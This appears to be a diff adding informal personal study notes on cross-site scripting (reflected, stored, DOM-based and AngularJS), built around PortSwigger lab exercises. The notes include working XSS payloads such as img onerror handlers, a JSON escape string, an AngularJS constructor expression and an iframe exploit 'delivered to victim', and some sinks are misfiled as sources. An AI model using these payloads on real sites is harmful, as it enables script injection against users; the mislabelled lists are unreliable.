@@ -1,0 +1,153 @@
+XSS types
+	when you are seaching somewhere and if its burf then the search text added in dom by js will not be shown
+
+
+	Reflected cross site attack
+		when a text box takes input and renders into the page
+			<script>alert(1)</script>
+			but if renders inside the tag then don't use script <img src=0 onerror="alert(1)">
+		check if eval is used  in the js and this is always vulnerable. JSON and Js response are not same 
+		    `abcd\"-alert(1)}//` for getting response like {"results":[],"searchTerm":"abcd\\"-alert(1)}//"}
+		also check if escape is there for few characters like /, ", ' 
+		use - instead of + because + is always URL encoded
+
+
+		https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected
+
+
+	Stored cross site attack
+		<script>alert(1)</script>
+
+	Dom-based XSS
+		DOM-based vulnerabilities arise when a website contains JavaScript that takes an attacker-controllable value, known as a source, and passes it into a dangerous function, known as a sink.
+		e.g. https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink
+		sources: All these are the sources of getting data which is attacker-controlled.
+			This can be done by doing serach in the url an check if something is coming or not. But this is not available with DOM because js manipulate here is not shown on inspect source
+
+
+			location.search
+			location.hash
+			document.referrer
+			document.cookie
+			document.write()
+			document.writeln()
+			document.domain
+			element.innerHTML
+			element.outerHTML
+			element.insertAdjacentHTML
+			element.onevent
+			
+		sinks: This evaluates attacker script if the attacker data is passed
+			This is tricky because the dom might not contain it as it happens with contains tag
+
+
+			document.body.innerHTML
+			document.write
+			$('')
+			or any eval function
+
+
+			Taint-flow vulnerabilities
+				document.URL
+				document.documentURI
+				document.URLUnencoded
+				document.baseURI
+				location
+				document.cookie
+				document.referrer
+				window.name
+				history.pushState
+				history.replaceState
+				localStorage
+				sessionStorage
+				IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
+				Database
+
+			js sinks 
+				add()
+				after()
+				append()
+				animate()
+				insertAfter()
+				insertBefore()
+				before()
+				html()
+				prepend()
+				replaceAll()
+				replaceWith()
+				wrap()
+				wrapInner()
+				wrapAll()
+				has()
+				constructor()
+				init()
+				index()
+				jQuery.parseHTML()
+				$.parseHTML()
+
+		attacking through img tag error
+			im = document.createElement("img")
+			im.src =0 #It sends the request looking for image instantenously and gets error
+			$('section .blog-list h2:contains(<img src="o" onerror="alert(0)">') # because contains creates a detached element if tags are passed
+
+			deliver this exploit to victim
+				<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+
+		
+
+		attack warning 
+			The innerHTML sink doesn't accept script elements on any modern browser, nor will svg onload events fire so use `<img src` onerror or onload tags>
+
+
+		DOM XSS in AngularJS
+			https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression
+			 AngularJS will execute JavaScript inside double curly braces that can occur directly in HTML or inside attributes
+			 	ng-app attribute
+
+			 	{{$on.constructor('alert(1)')()}}
+
+		<script>document.write(alert(1))</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+TO read:
+	https://portswigger.net/web-security/dom-based
+
+
+
+
+
+
+
+
+
+
+		
